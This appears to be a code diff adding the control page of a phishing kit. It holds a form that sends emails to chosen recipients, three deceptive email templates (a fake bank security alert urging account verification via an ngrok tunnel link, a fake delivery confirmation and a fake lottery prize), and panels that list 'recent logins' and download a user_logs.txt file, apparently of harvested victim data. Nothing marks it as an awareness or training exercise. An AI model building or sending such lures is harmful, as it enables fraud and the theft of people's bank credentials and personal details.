@@ -1,0 +1,393 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMTP Server Events</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: #f4f4f4;
+        }
+        h1 {
+            margin: 20px 0;
+        }
+        .container {
+            width: 90%;
+            max-width: 800px;
+            background: #fff;
+            padding: 20px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+        label {
+            margin: 10px 0 5px;
+        }
+        input, select, textarea, button {
+            padding: 10px;
+            font-size: 14px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            width: 100%;
+        }
+        button {
+            background-color: #007bff;
+            color: white;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        textarea {
+            resize: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>SMTP Server Events</h1>
+    <form id="email-form">
+        <label for="domain">Domain:</label>
+        <select id="domain" name="domain" required>
+            <option value="" disabled selected>Select a domain</option>
+            <option value="Bank">Bank</option>
+            <option value="Delivery">Delivery</option>
+            <option value="Lottery">Lottery</option>
+        </select>
+
+        <label for="to">To:</label>
+        <input type="email" id="to" name="to" required>
+
+        <label for="name">Name:</label>
+        <input type="text" id="name" name="name" required>
+
+        <label for="subject">Subject:</label>
+        <input type="text" id="subject" name="subject" required>
+
+        <label for="text">Message:</label>
+        <textarea id="text" name="text" rows="10" readonly required></textarea>
+
+        <button type="submit">Send Email</button>
+
+        
+        <h2>Recent Logins</h2>
+        <ul id="recent-logs">
+            <!-- Logs will be dynamically loaded here -->
+        </ul>
+        
+        <h2>Download Logs</h2>
+        <button id="download-logs">Download user_logs.txt</button>
+    </form>
+
+    <script>
+    // Fetch and display recent logs
+    async function loadRecentLogs() {
+        try {
+            const response = await fetch('/recent-logs');
+            const logs = await response.json();
+            const logList = document.getElementById('recent-logs');
+            logList.innerHTML = ''; // Clear previous logs
+
+            if (logs.length === 0) {
+                logList.innerHTML = '<li>No logs available.</li>';
+            } else {
+                logs.forEach((log) => {
+                    const listItem = document.createElement('li');
+                    listItem.textContent = log;
+                    logList.appendChild(listItem);
+                });
+            }
+        } catch (error) {
+            console.error('Error fetching recent logs:', error);
+        }
+    }
+
+    // Download logs
+    document.getElementById('download-logs').addEventListener('click', () => {
+        window.location.href = '/download-logs';
+    });
+
+    // Load logs on page load
+    window.onload = loadRecentLogs;
+
+        const templates = {
+            "Bank": `
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Alert: Suspicious Activity Detected</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background-color: #f9f9f9;
+            padding: 0;
+            margin: 0;
+        }
+        .email-container {
+            max-width: 600px;
+            margin: 30px auto;
+            padding: 20px;
+            background-color: #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            border: 1px solid #ddd;
+        }
+        .email-header {
+            font-size: 24px;
+            font-weight: bold;
+            color: #d32f2f;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .email-body {
+            font-size: 16px;
+            line-height: 1.8;
+        }
+        .cta-button {
+            display: inline-block;
+            margin: 20px 0;
+            padding: 10px 18px;
+            background-color: #d32f2f;
+            color: #fff;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: bold;
+            border-radius: 4px;
+        }
+        .cta-button:hover {
+            background-color: #b71c1c;
+        }
+        .email-footer {
+            font-size: 14px;
+            color: #777;
+            text-align: center;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="email-container">
+        <div class="email-header">Security Alert</div>
+        <div class="email-body">
+            <p>Dear {name},</p>
+            <p>We have noticed suspicious activity in your bank account ending with <strong>1234</strong>.</p>
+            <p>For your security, please verify your account details immediately by clicking the button below:</p>
+            <a href="https://gator-precise-luckily.ngrok-free.app?id={name}" class="cta-button" target="_blank">Verify Account Details</a>
+            <p>If you do not verify your information within <strong>12 hours</strong>, we may temporarily lock your account to protect your funds.</p>
+        </div>
+        <div class="email-footer">
+            Sincerely,<br>
+            Your Bank Security Team
+        </div>
+    </div>
+</body>
+</html>
+`,
+            "Delivery": `
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Delivery Confirmation</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            color: #333;
+        }
+     
+        .email-container {
+            width: 100%;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f9f9f9;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+        }
+        .email-header {
+            font-size: 24px;
+            font-weight: bold;
+            color: #4CAF50;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .email-body {
+            font-size: 16px;
+        }
+        .email-footer {
+            font-size: 14px;
+            color: #777;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .cta-button {
+            display: inline-block;
+            margin: 20px 0;
+            padding: 10px 18px;
+            background-color: #4CAF50;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        .cta-button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="email-container">
+        <div class="email-header">Delivery Confirmation</div>
+        <div class="email-body">
+            <p>Hello {name},</p>
+            <p>Your package with tracking number <strong>62931371351</strong> is scheduled for delivery but requires your confirmation.</p>
+            <p>Please confirm your delivery details by clicking the button below:</p>
+            <a href="http://localhost:3000?id={name}" class="cta-button" target="_blank">Confirm Delivery Details</a>
+            <p>Failure to update your details may result in your package being returned to sender.</p>
+            <p>Thank you!</p>
+        </div>
+        <div class="email-footer">
+            If you have any questions, please contact our support team.
+        </div>
+    </div>
+</body>
+</html>
+`,
+            
+
+"Lottery": `
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Congratulations! Claim Your Prize</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background-color: #f9f9f9;
+            padding: 0;
+            margin: 0;
+        }
+        .email-container {
+            max-width: 600px;
+            margin: 30px auto;
+            padding: 20px;
+            background-color: #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            border: 1px solid #ddd;
+        }
+        .email-header {
+            font-size: 24px;
+            font-weight: bold;
+            color: #ff9800;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .email-body {
+            font-size: 16px;
+            line-height: 1.8;
+        }
+        .cta-button {
+            display: inline-block;
+            margin: 20px 0;
+            padding: 12px 20px;
+            background-color: #ff9800;
+            color: #fff;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 5px;
+        }
+        .cta-button:hover {
+            background-color: #e68900;
+        }
+        .email-footer {
+            font-size: 14px;
+            color: #777;
+            text-align: center;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="email-container">
+        <div class="email-header">Congratulations, {name}!</div>
+        <div class="email-body">
+            <p>You have been selected as the winner of our <strong>$10,000 prize giveaway!</strong></p>
+            <p>To claim your prize, simply click the button below and provide the required details:</p>
+            <a href="http://localhost:3000?id={name}" class="cta-button" target="_blank">Claim Your Prize</a>
+            <p>Act fast! You must claim your prize within <strong>48 hours</strong>.</p>
+        </div>
+        <div class="email-footer">
+            Best regards,<br>
+            The Giveaway Team
+        </div>
+    </div>
+</body>
+</html>
+`
+        };
+
+        function updateMessage() {
+            const domain = document.getElementById('domain').value;
+            const name = document.getElementById('name').value;
+            const subject = document.getElementById('subject').value;
+
+            // Ensure domain, name, and subject are provided before populating the message
+            if (domain && name && subject) {
+                const template = templates[domain];
+                if (template) {
+                    const message = template.replace(/{name}/g, name);
+                    document.getElementById('text').value = message;
+                }
+            } else {
+                // Clear the message box if all required inputs aren't filled
+                document.getElementById('text').value = '';
+            }
+        }
+
+        // Add event listeners to monitor when the fields are updated
+        document.getElementById('domain').addEventListener('change', updateMessage);
+        document.getElementById('name').addEventListener('input', updateMessage);
+        document.getElementById('subject').addEventListener('input', updateMessage);
+
+        // Submit the form and send email
+        document.getElementById('email-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const to = document.getElementById('to').value;
+            const subject = document.getElementById('subject').value;
+            const text = document.getElementById('text').value;
+
+            try {
+                const response = await fetch('/api/send', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ to, subject, text }),
+                });
+
+                const result = await response.json();
+                alert(result.message);
+            } catch (error) {
+                alert('Error sending email');
+            }
+        });
+    </script>
+</body>
+</html>
